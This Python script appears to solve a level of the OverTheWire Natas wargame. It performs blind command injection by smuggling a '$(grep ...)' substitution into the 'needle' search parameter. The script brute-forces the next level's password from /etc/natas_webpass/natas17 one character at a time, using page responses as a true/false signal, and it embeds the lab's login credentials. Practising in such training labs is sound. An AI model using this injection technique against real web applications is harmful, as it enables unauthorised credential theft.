"""Use subprocess injection to grep the password for the next level.
The application does a passthrough to grep for a search string in a dict.
We inject the a subprocess into the search string. The searchstring will be 
a known match in the dictionary on the server + the result of the injected 
subprocess. 
The subprocess is also a grep command. But we use it to extract the pw from 
/etc/natas_webpass/natas17. 
If we can make a match there than the subprocess returns the pw. The searchstring
for the grep done by the application will not be in the dict. However, if 
we dont match with our grep, the subprocess will return an empty string. Then the 
searchstring is just the known match, which is also found in the dict. 
This gives us a binary response that we can use to map out the password.


Johannes Cartus, 24.03.2021
"""

import requests
import re

# login information
url = "http://natas16.natas.labs.overthewire.org"
user = "natas16"
password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

possible_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
pw_length = 32




def main():


    # This is one of the strings we know to be in the dictionary the application 
    # applied grep to.
    # if inner grep with new char fails the subprocess will return an empty 
    # string. Then the marker will appear in the response from the website
    char_found_marker = "Africans"


    natas17_password = ""


    for index in range(pw_length):

        for c in possible_chars:

            #--- make payload ---
            #payload = "African" # intended use
            payload = char_found_marker + \
                f'$(grep ^{natas17_password}{c} /etc/natas_webpass/natas17)'

            print("[ ] " + payload)
            #---

            #--- make request ---
            session = requests.Session()
            response = session.get(
                url, 
                auth=(user, password),
                params={
                    "needle": payload, 
                    "Submit": "search"
                }    
            )
            #---


            #--- logging ---


            if re.search(char_found_marker, response.text):
                # if the marker is found on the parge that means the 
                # subprocess returned an empty string (we did not find a new 
                # character of the pw)

                print("[ ] no luck with " + str(c))
            
            elif re.search("error", response.text):
                print("[w] Error found!")
                

            else:
                # if there was not error and the marker does not appear we found
                # a new char of the pw.

                # store pw character
                natas17_password += c
                
                # report to user
                print(f"[#] Found a character nr. {index}: {c}")
                print(f"[#] Known part of pw: {natas17_password}")

                # continue with next character
                break
            
            

    print("----------------------")
    print("[ ] We are done! Hurray :D")    
    print("[#] natas16 pw is: " + natas17_password)

if __name__ == '__main__':
    main()
